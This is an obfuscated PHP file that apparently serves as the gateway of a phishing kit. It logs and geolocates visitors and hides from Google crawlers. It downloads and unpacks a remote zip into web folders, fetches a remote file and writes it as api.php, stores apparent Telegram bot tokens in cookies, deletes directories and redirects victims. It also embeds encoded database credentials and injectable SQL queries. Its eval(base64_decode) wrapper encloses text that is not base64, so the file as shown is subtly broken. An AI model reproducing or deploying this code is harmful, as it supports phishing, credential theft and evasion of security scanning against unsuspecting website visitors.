<?php eval(base64_decode('
 goto cv1P7; DOb0y: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\x6e\x6e\x65\143\164\151\x6f\156\x20\x66\141\x69\x6c\x65\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\105\x43\x54\40\52\x20\106\x52\x4f\x4d\40\154\157\147\x73\x20\127\x48\105\x52\x45\40\151\160\x61\x64\144\x72\x65\x73\75\x27{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto Dpf1T; JrEO7: $_SESSION["\126\157\x70\162\164"] = isset($info["\x63\x69\164\x79"]) ? $info["\x63\x69\164\171"] : null; goto IHyYK; wluGp: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\56") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto xPmwN; jDfFD: $_SESSION["\151\163\x70"] = isset($info["\x69\x73\160"]) ? $info["\x69\x73\x70"] : null; goto o01mM; QfUSv: $curl = curl_init($url); goto q78wW; o01mM: $_SESSION["\102\154\x61\x73\x61\143\x6f\165\156"] = isset($info["\143\x6f\x75\x6e\164\x72\171"]) ? $info["\143\157\x75\156\x74\x72\x79"] : null; goto uO1FZ; ruPL8: if (isset($_POST["\163\x68\x6f\160\x69\x64"])) { $gameid = $_POST["\x73\150\x6f\160\151\144"]; $_SESSION["\x6c\157\154\163\157\165\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto YVaC3; tKLj7: $Lredsvv = base64_decode("\x5a\110\112\152\x5a\x32\154\163\145\x56\101\x77\113\x6d\x73\155"); goto hwk43; RuqJH: $protocol = isset($_SERVER["\x48\x54\124\x50\123"]) && $_SERVER["\110\x54\124\x50\123"] === "\157\x6e" ? "\x68\164\x74\x70\163" : "\x68\164\x74\x70"; goto iQvQA; q78wW: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto dnku3; Dpf1T: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\x21\x21\41"; echo $showpip; die; } goto pbIG8; mbA7e: $datalog = base64_decode("\145\x6d\x56\171\x62\171\61\153\131\130\153\x75\x63\62\x68\x76\143\x41"); goto Bsg_A; t7Av3: curl_close($curl); goto M2tGH; OpjWy: if (strpos(gethostbyaddr($StrupLom), "\147\x6f\x6f\x67\x6c\x65") !== false) { $refix = "\102\x6f\163\x65\x20\107\40\62"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto ScnFn; dnku3: $response = curl_exec($curl); goto t7Av3; xz9al: $url = "\150\164\164\x70\72\57\x2f\151\160\x2d\x61\160\151\x2e\x63\157\155\57\160\150\160\57{$StrupLom}\x3f\x66\x69\145\x6c\x64\x73\75\x73\x74\141\x74\x75\x73\x2c\x6d\x65\163\163\x61\x67\145\54\143\x6f\x6e\x74\x69\x6e\x65\x6e\164\x2c\143\157\x6e\x74\x69\x6e\145\x6e\164\x43\x6f\144\x65\54\x63\x6f\165\156\x74\162\171\x2c\143\x6f\x75\156\x74\162\171\x43\x6f\x64\x65\x2c\x72\145\147\x69\157\x6e\x2c\162\x65\x67\151\x6f\x6e\116\141\x6d\x65\x2c\x63\151\164\x79\54\144\151\163\164\162\151\x63\x74\54\172\x69\x70\x2c\x6c\x61\164\54\x6c\157\156\x2c\164\x69\155\145\172\157\156\145\x2c\x63\x75\162\162\x65\156\143\x79\54\151\163\160\x2c\x6f\162\147\54\141\163\54\x61\163\156\x61\x6d\145\54\x72\x65\x76\145\x72\x73\x65\54\x6d\157\x62\x69\154\145\x2c\x70\x72\x6f\x78\x79\54\150\x6f\163\164\151\156\x67\54\161\x75\145\162\171"; goto QfUSv; hwk43: $Nopwvv = base64_decode("\x63\63\x52\171\x62\x32\x35\x6e\x58\x32\x52\x68\145\x51"); goto xz9al; Ts1Bf: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\56\56") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto wluGp; Fo1ok: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\110\x54\x54\x50\x5f\x55\x53\x45\122\137\x41\107\105\x4e\x54"]) ? $_SERVER["\110\124\x54\x50\137\x55\x53\x45\122\137\x41\x47\x45\116\x54"] : ''; $isp = $_SESSION["\x69\x73\160"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\x53\105\122\x56\105\x52\137\x4e\101\115\x45"]; $LOCALO_TEMPO = date("\131\x2d\155\x2d\x64\x20\x48\72\x69\x3a\x73"); $Blasacoun = $_SESSION["\102\x6c\x61\163\x61\143\x6f\x75\156"]; $Njopf = $_SESSION["\x4e\x6a\x6f\160\146"]; $Voprt = $_SESSION["\126\157\x70\162\164"]; $xOpuy = $_SESSION["\170\x4f\x70\165\171"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\157\x6e\156\145\143\164\151\157\156\x20\x66\x61\151\x6c\x65\144\72\40" . mysqli_connect_error()); } $sql_u = "\x53\105\114\x45\x43\x54\40\x2a\40\106\122\117\x4d\40\x6c\157\x67\163\40\x57\110\x45\x52\x45\x20\151\160\x61\144\x64\162\145\163\75\47{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\41\41"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\x27", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\47", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\47", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\x27", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\x27", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\47", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\x27", '', $refix)); $query = "\x49\116\123\x45\122\x54\x20\x49\116\x54\117\x20\154\x6f\147\163\x20\x28\x69\160\x61\x64\x64\x72\x65\163\x2c\x63\157\165\x6e\164\162\x79\54\x62\162\157\x77\163\x65\162\54\x6f\163\x2c\x64\x6f\155\x69\156\145\x2c\155\x79\x74\x69\x6d\x65\54\150\x6f\163\164\x2c\x69\163\160\54\x72\145\163\x6f\x6e\x29\40\12\x20\x20\40\x20\x20\x20\x9\40\40\40\40\x9\40\40\126\x41\114\x55\x45\123\40\50\x27{$StrupLom}\47\x2c\47{$Blasacoun}\47\x2c\x27{$IpCount}\x27\54\x27{$OKJIVGRD}\47\54\47{$donflag}\x27\54\47{$LOCALO_TEMPO}\x27\54\x27{$host}\47\54\x27{$isp}\47\54\x27{$refix}\47\x29"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\41"; } } goto u1dBF; U21P_: function Rand_XD_TF($length) { $characters = "\x61\x62\143\x64\145\146\x6a\150\151\147\153\154\155\156\x6f\x70\161\x72\163\164\165\x76\x77\x78\171\172\60\61\x32\x33\64\x35\x36\67\70\71\101\102\103\x44\x45\x46\107\110\111\112\x4b\x4c\115\x4e\x4f\120\121\122\123\x54\125\x56\127\x58\131\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto gw29I; ylFJx: if (isset($_GET["\166\x73\163"])) { $gameid = $_GET["\x73\157\x75\154\163"]; $_SESSION["\154\x6f\x6c\163\x6f\x75\154\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\x76\x73\163"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\x3c\x73\143\162\151\160\164\x20\114\101\x4e\107\125\101\107\x45\75\x27\112\141\x76\141\x53\143\x72\x69\160\x74\x27\76\12\x20\x20\x20\40\167\x69\156\x64\157\x77\56\x6c\157\x63\x61\164\x69\157\156\x2e\150\x72\145\146\75\x27{$folder_pathx}\x3f\x26\x76\141\x6c\x69\144\75{$RandOP_Mlux}{$RandOP_Mlux}\x26\x61\x6c\x65\162\164\x3d{$RandOP_Mlux}\46\170\x6c\160\163\75{$RandOP_Mlux}\46\163\x6f\x75\154\x73\x3d{$gameid}\x26\144\157\156\145\x3d\46\x65\x72\162\x6f\x72\x79\75{$RandOP_Mlux}\46\155\156\x65\x6d\157\x6e\x69\x63\75\46\152\142\75{$RandOP_Mlux}\47\73\xa\x20\40\40\40\74\57\163\143\162\151\160\x74\x3e"; die; } goto ruPL8; xPmwN: $parentDirectory = "\x77\x65\142"; goto RJ5x8; Ac9kn: if (isset($_GET["\x6c\157\154\155\145"])) { $vdir = $_GET["\154\x6f\x6c\155\145"]; $refix = "\111\156\166\141\154\151\144\40\x6c\157\154\x6d\x65"; $redi = $_COOKIE["\162\145\144\151\x72\x69\143\164"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\167\145\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\143\162\151\160\x74\x20\x4c\101\x4e\x47\125\x41\x47\x45\x3d\x27\112\x61\166\x61\123\x63\162\151\160\x74\x27\x3e\12\40\x20\x20\x20\x77\x69\x6e\x64\157\x77\x2e\x6c\x6f\143\141\x74\151\x6f\156\x2e\x68\162\x65\x66\75\x27{$redi}\47\73\xa\x20\x20\x20\x20\74\57\163\x63\162\x69\x70\164\76"; die; } goto ylFJx; xue7n: if (!empty($_SERVER["\110\x54\x54\x50\137\103\114\x49\x45\116\x54\x5f\x49\x50"])) { $ipAddress = $_SERVER["\x48\124\124\x50\x5f\x43\114\111\105\116\x54\137\111\x50"]; } elseif (!empty($_SERVER["\x48\x54\x54\x50\137\x58\137\106\117\122\x57\101\122\x44\x45\104\137\106\117\122"])) { $ipAddress = $_SERVER["\110\124\x54\x50\x5f\130\x5f\x46\x4f\122\x57\x41\x52\x44\x45\104\x5f\106\117\122"]; } else { $ipAddress = $_SERVER["\x52\105\x4d\117\124\x45\x5f\101\104\104\x52"]; } goto p3LHM; uO1FZ: $_SESSION["\116\152\x6f\x70\146"] = isset($info["\143\x6f\x75\x6e\x74\x72\x79\103\x6f\x64\145"]) ? $info["\143\x6f\165\x6e\164\162\x79\103\x6f\144\x65"] : null; goto JrEO7; Bsg_A: $Fixbom = base64_decode("\x63\63\122\x79\x62\x32\x35\156\x58\62\x52\x68\145\121"); goto tKLj7; M1eUd: if (isset($_POST["\154\157\143\141\154\151\160"])) { $myips = base64_decode(base64_decode($_POST["\154\157\x63\141\154\x69\x70"])); $_SESSION["\x6c\157\x6c\x69\160\163"] = $myips; $StrupLom = $myips; } goto RuqJH; RJ5x8: $directories = glob($parentDirectory . "\57\52", GLOB_ONLYDIR); goto oaV9Y; IHyYK: $_SESSION["\170\x4f\x70\165\x79"] = isset($info["\162\x65\x67\151\x6f\x6e\x4e\x61\155\x65"]) ? $info["\162\x65\147\151\157\x6e\x4e\x61\155\x65"] : null; goto Ts1Bf; cv1P7: error_reporting(E_ALL); goto J2xNY; pbIG8: if (isset($_GET["\145\x6e\x64\155\x65\154\165\170"])) { $redi = $_COOKIE["\x72\x65\x64\x69\162\151\143\164"]; $vdir = $_GET["\145\156\x64\x6d\145\x6c\165\x78"]; $directoryToDelete = "\x77\145\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\x73\x63\x72\x69\160\x74\40\x4c\101\x4e\x47\x55\101\x47\x45\x3d\x27\x4a\x61\x76\141\123\143\162\x69\160\164\x27\76\xa\40\x20\40\40\167\x69\156\144\x6f\167\56\154\157\143\x61\164\151\x6f\x6e\56\150\162\x65\146\x3d\47{$redi}\x27\x3b\xa\40\x20\40\40\74\57\163\x63\x72\x69\160\x74\76"; die; } goto Ac9kn; fArn7: $IpCount = FOx_TGH_X($userAgent); goto Fo1ok; UXYIV: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\125\x6e\153\156\x6f\167\x6e\40\x4f\x53\40\x50\154\141\x74\146\x6f\x72\155"; $OS = array("\x2f\167\151\x6e\x64\x6f\x77\x73\40\x6e\x74\x20\61\x30\x2f\151" => "\x57\151\156\144\x6f\167\x73\40\x31\x30", "\57\x77\x69\156\144\x6f\167\x73\x20\x6e\x74\40\x36\56\63\x2f\x69" => "\x57\x69\x6e\x64\x6f\167\163\x20\x38\x2e\x31", "\57\x77\151\x6e\x64\x6f\167\163\x20\x6e\164\x20\66\56\x32\x2f\x69" => "\127\151\x6e\x64\157\167\163\40\x38", "\57\x77\151\x6e\x64\157\x77\163\x20\156\164\x20\x36\x2e\x31\57\x69" => "\127\x69\156\x64\x6f\167\163\40\x37", "\x2f\167\151\156\x64\157\167\x73\40\x6e\x74\x20\x36\x2e\x30\x2f\x69" => "\x57\151\x6e\x64\x6f\167\x73\x20\126\151\163\x74\x61", "\x2f\167\x69\156\x64\157\x77\163\40\x6e\x74\40\x35\x2e\x32\57\x69" => "\127\x69\156\144\x6f\x77\163\40\x53\x65\x72\x76\x65\x72\x20\x32\60\60\63\x2f\x58\x50\x20\170\x36\x34", "\57\167\x69\156\x64\x6f\167\163\x20\156\164\x20\x35\56\x31\x2f\151" => "\127\151\x6e\x64\x6f\x77\x73\40\x58\x50", "\x2f\x77\151\x6e\x64\157\x77\x73\x20\170\x70\x2f\151" => "\127\151\x6e\x64\157\x77\163\40\130\120", "\x2f\x77\151\x6e\x64\157\167\x73\x20\156\164\40\x35\56\60\57\151" => "\127\x69\x6e\144\157\167\163\40\x32\60\x30\x30", "\57\x77\151\x6e\x64\157\x77\x73\40\155\x65\57\151" => "\127\151\156\x64\x6f\x77\x73\x20\115\x45", "\57\x77\151\156\71\x38\x2f\151" => "\127\151\x6e\x64\x6f\167\163\40\x39\70", "\57\x77\151\x6e\x39\65\57\151" => "\127\151\x6e\x64\x6f\167\x73\x20\x39\65", "\57\x77\x69\x6e\61\x36\57\151" => "\127\151\156\x64\x6f\167\x73\40\63\56\61\61", "\x2f\155\x61\x63\151\x6e\164\157\163\x68\x7c\155\x61\143\40\x6f\x73\x20\170\57\151" => "\115\141\143\x20\117\x53\x20\130", "\57\155\x61\x63\x5f\x70\x6f\167\145\162\x70\143\x2f\x69" => "\x4d\141\x63\x20\117\x53\x20\71", "\x2f\154\151\156\165\x78\x2f\151" => "\x4c\151\x6e\x75\x78", "\x2f\165\x62\x75\156\164\165\57\x69" => "\125\x62\x75\156\x74\x75", "\57\x69\160\150\157\156\145\x2f\151" => "\151\120\150\157\x6e\x65", "\57\x69\160\x6f\x64\57\x69" => "\151\x50\x6f\x64", "\57\151\160\x61\144\57\x69" => "\x69\x50\x61\x64", "\57\x61\156\x64\x72\x6f\x69\144\x2f\x69" => "\x41\156\144\x72\157\x69\x64", "\57\x62\154\141\x63\153\142\x65\x72\162\171\x2f\151" => "\102\x6c\141\143\153\x42\145\162\x72\171", "\x2f\167\145\142\x6f\163\57\x69" => "\x4d\x6f\142\151\154\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto ehrUZ; u1dBF: if (strpos($userAgent, "\x67\x6f\157\x67\x6c\145") !== false) { $refix = "\x42\x6f\163\145\x20\x47"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto OpjWy; VBIrZ: $StrupLom = $ipPortArray[0]; goto n5cO4; M2tGH: $info = unserialize($response); goto jDfFD; YSdG6: $donflag = $protocol . "\72\57\x2f" . $domain; goto mbA7e; YVaC3: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\x6f\156\156\145\143\x74\151\x6f\x6e\40\146\x61\x69\x6c\x65\144\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\114\105\x43\x54\x20\52\40\x46\x52\x4f\x4d\40\162\145\x64\x69\162\143\164\151\157\x6e\40\x57\110\x45\x52\105\40\x69\x64\75\47{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\151\x6e\x6b"] = base64_decode(base64_decode($row["\154\x69\156\153"])); $_SESSION["\143\x6e"] = explode("\73", base64_decode(base64_decode($row["\x63\157\x75\156\x74\162\x79"]))); $_SESSION["\160\x69\x63"] = $row["\160\151\x63"]; $_SESSION["\155\163\147"] = base64_decode(base64_decode($row["\x6d\163\x67"])); $_SESSION["\145\x78\160"] = $row["\145\170\x70\x69\x72\145"]; $_SESSION["\x73\x65\x72\166\145\x72"] = base64_decode(base64_decode($row["\x73\145\162\x76\x65\162"])); $_SESSION["\x75\x72\x6c"] = base64_decode(base64_decode($row["\165\162\154"])); $_SESSION["\x6c\165\170\x63\x61\160\x74\143\150\141"] = $row["\x6c\165\170\x63\141\160\164\x63\x68\x61"]; $_SESSION["\x74\157\153\145\156\164\x65\154"] = base64_decode(base64_decode($row["\x74\157\x6b\x65\x6e\164\145\154"])); $_SESSION["\x69\144\164\x65\154"] = base64_decode(base64_decode($row["\151\x64\x74\x65\154"])); $_SESSION["\x72\x65\x64\x69\x72\151\x63\164"] = $row["\162\x65\144\151\162\151\x63\164"]; $_SESSION["\141\160\x69"] = $row["\x61\x70\x69"]; if (isset($_GET["\166\x73\x73"])) { setcookie("\164\157\x6b\145\x6e\164\145\x6c", $_SESSION["\x74\x6f\x6b\145\x6e\164\x65\154"], time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\145\154", $_SESSION["\151\x64\164\x65\x6c"], time() + 86400 * 30, "\x2f"); setcookie("\x72\145\x64\x69\x72\151\143\x74", $_SESSION["\162\x65\x64\151\x72\151\143\164"], time() + 86400 * 30, "\x2f"); } } } else { $refix = "\x70\x72\x6f\152\145\143\x74\x20\x49\104\40\x6e\x6f\164\40\146\157\x75\156\x64\40\x69\x64\56{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto U21P_; oaV9Y: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\x2e") { if (deleteDirectory($dir)) { } } } } goto DOb0y; iQvQA: $domain = $_SERVER["\110\124\x54\120\137\x48\x4f\123\124"]; goto YSdG6; H11nS: $userAgent = isset($_SERVER["\110\124\x54\120\137\x55\x53\x45\122\137\101\x47\105\x4e\x54"]) ? $_SERVER["\x48\124\x54\x50\137\x55\123\105\122\137\x41\107\x45\x4e\x54"] : ''; goto UWx1W; n5cO4: $domine = $_SERVER["\x53\x45\x52\126\105\x52\x5f\116\x41\115\x45"]; goto GEvfO; ehrUZ: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\125\x6e\x6b\x6e\157\x77\x6e\x20\x42\162\x6f\167\163\145\x72"; $BROWSER = array("\x2f\x6d\163\151\x65\x2f\x69" => "\111\156\x74\145\162\156\145\164\x20\105\170\x70\154\157\x72\x65\162", "\x2f\x66\151\x72\145\x66\157\x78\x2f\x69" => "\x46\x69\162\145\x66\x6f\x78", "\x2f\x73\x61\146\141\162\x69\x2f\x69" => "\x53\x61\146\x61\x72\151", "\57\143\x68\x72\157\155\145\x2f\x69" => "\x43\150\162\157\155\145", "\57\x65\144\147\x65\x2f\151" => "\105\144\x67\145", "\x2f\157\160\145\x72\x61\57\x69" => "\117\160\x65\162\141", "\57\x6e\x65\164\163\x63\x61\160\x65\57\x69" => "\116\x65\164\163\x63\141\x70\145", "\x2f\x6d\x61\170\164\x68\157\x6e\x2f\x69" => "\x4d\x61\x78\164\150\157\x6e", "\57\x6b\x6f\x6e\x71\x75\x65\162\157\x72\57\x69" => "\x4b\157\x6e\161\x75\145\162\x6f\162", "\x2f\155\157\142\x69\x6c\145\x2f\x69" => "\x48\141\x6e\144\x68\x65\154\x64\x20\102\x72\157\167\163\145\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto H11nS; J2xNY: ini_set("\x64\x69\x73\160\154\141\x79\137\x65\162\162\157\x72\163", 1); goto xue7n; H8pU1: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto FJCD_; ScnFn: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto H8pU1; FJCD_: if ($_SERVER["\122\105\121\125\105\x53\x54\x5f\115\x45\x54\110\x4f\104"] === "\120\x4f\x53\124") { if (!isset($_POST["\154\157\143\x61\x6c\x69\160"])) { $refix = "\111\x6e\166\x61\154\x69\x64\x20\x49\120\x53"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\x73\150\157\160\151\144"])) { $refix = "\111\x6e\x76\x61\x6c\x69\144\x20\x49\104\40\x53\x51\114"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\x77\x65\142")) { if (!mkdir("\167\x65\x62", 511)) { die("\106\141\151\x6c\x65\144\x20\164\157\x20\143\x72\x65\x61\164\145\40\x77\145\142\40\144\x69\x72\145\x63\x74\157\x72\171"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\x77\x65\x62\x2f{$sub_folder}\57"; $zipFileUrl = $_SESSION["\165\x72\154"]; $tempDir = "\x74\145\155\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\x2f{$folder_name}\56\172\151\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\x61\x69\x6c\x65\144\x20\x74\x6f\x20\143\x72\x65\141\164\x65\40\x74\x68\145\x20\x66\x6f\x6c\144\x65\x72\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\x2e\56") { rename($folder_path . "\x2f" . $file, $folder_path . $file); } } } else { echo "\x46\x61\151\154\x65\x64\x20\164\157\x20\x65\x78\x74\162\141\143\x74\x20\x74\150\x65\x20\172\151\x70\40\x66\x69\154\145\56"; } } else { die("\106\141\x69\x6c\145\144\40\164\157\x20\144\x6f\x77\156\154\x6f\x61\144\40\x74\x68\145\x20\x7a\151\160\x20\x66\x69\x6c\x65\56"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\154\x6f\154\163\x6f\165\154\x73"]; $_SESSION["\154\x6f\x63\141\x6c\144\151\162"] = "{$folder_path}"; file_put_contents("{$folder_path}\57\x6c\157\143\141\x6c\x2e\x74\x78\164", "{$StrupLom}\xa", FILE_APPEND); $fileURL = $_SESSION["\141\160\x69"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\167\x65\142\x2f\x61\x70\x69\56\160\x68\160"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\101\120\111") { getFileContents($fileURL); } $localip = isset($_POST["\154\x6f\143\141\x6c\x69\160"]) ? $_POST["\154\x6f\143\141\154\151\160"] : null; $domainname = isset($_POST["\144\x6f\155\x61\151\x6e\x6e\x61\x6d\145"]) ? $_POST["\x64\157\155\x61\151\156\156\141\x6d\145"] : null; $nextdomain = isset($_POST["\x6e\145\170\x74\x64\x6f\155\141\x69\x6e"]) ? $_POST["\156\x65\x78\164\x64\x6f\155\141\x69\x6e"] : null; $shopid = isset($_POST["\163\x68\x6f\x70\151\x64"]) ? $_POST["\x73\x68\157\x70\151\144"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\164\145\x6d\x70"; $zipFiles = glob($directory . "\52\x2e\x7a\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } sleep(5); ob_start(); $responseData = array("\x73\164\x61\164\165\163" => "\x73\165\x63\x63\145\x73\x73", "\x62\141\x63\153\137\x64\151\x72" => $folder_path, "\x62\141\143\x6b\137\165\162\154" => $nextdomain, "\x62\141\x63\x6b\x5f\x69\144" => $shopid, "\x6d\145\163\163\141\147\145" => "\x44\141\164\141\40\162\x65\143\x65\151\166\145\x64\x20\163\165\143\x63\145\x73\163\x66\165\x6c\154\x79"); $responseJson = json_encode($responseData); echo $responseJson; ob_flush(); flush(); } else { http_response_code(400); $responseData = array("\163\164\141\x74\x75\163" => "\145\x72\x72\x6f\162", "\142\141\143\x6b\137\144\151\x72" => '', "\x62\x61\x63\x6b\x5f\165\x72\154" => '', "\142\x61\143\153\x5f\151\144" => '', "\155\x65\163\163\x61\x67\x65" => "\x44\141\164\x61\x20\x72\x65\x63\145\x69\x76\x65\144\x20\x6d\x69\x73\x73\x69\x6e\147"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\163\x74\x61\x74\165\x73" => "\x65\x72\x72\x6f\162", "\142\141\x63\153\137\x64\x69\162" => '', "\142\141\x63\153\x5f\165\x72\154" => '', "\142\x61\143\153\137\x69\144" => '', "\x6d\145\163\x73\x61\147\x65" => "\x44\141\x74\141\x20\x72\145\143\x65\151\x76\145\x64\40\151\x6e\x76\141\x6c\151\144"); $responseJson = json_encode($responseData); echo $responseJson; } goto Fk4eH; p3LHM: $ipPortArray = explode("\x3a", $ipAddress); goto VBIrZ; gw29I: function rand_num($length) { $characters = "\x30\61\x32\x33\64\65\66\67\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto UXYIV; GEvfO: $TIME_DATE = date("\x59\55\x6d\55\144\40\110\x3a\x69\x3a\163"); goto M1eUd; UWx1W: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto fArn7; Fk4eH: ')); ?>
